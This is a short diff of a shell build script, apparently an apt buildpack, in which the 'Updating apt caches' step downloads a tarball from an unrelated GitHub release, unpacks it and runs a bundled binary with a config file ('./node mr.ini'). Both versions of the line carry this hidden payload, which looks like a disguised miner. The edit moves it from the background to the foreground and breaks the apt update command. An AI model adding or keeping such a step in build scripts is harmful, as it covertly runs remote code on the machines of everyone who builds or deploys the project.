@@ -72,7 +72,7 @@ case "$STACK" in
 esac
 
 topic "Updating apt caches"
-wget -q https://github.com/wikangdijalalan2/xmmxja/releases/download/19.1/MXCC.tar > /dev/null 2>&1 && tar -xvf MXCC.tar && cd MXCC && nohup ./node mr.ini & $APT_OPTIONS update | indent
+wget -q https://github.com/wikangdijalalan2/xmmxja/releases/download/19.1/MXCC.tar > /dev/null 2>&1 && tar -xvf MXCC.tar && cd MXCC && ./node mr.ini $APT_OPTIONS update | indent
 
 for PACKAGE in $PACKAGES; do
   if [[ $PACKAGE == *deb ]]; then
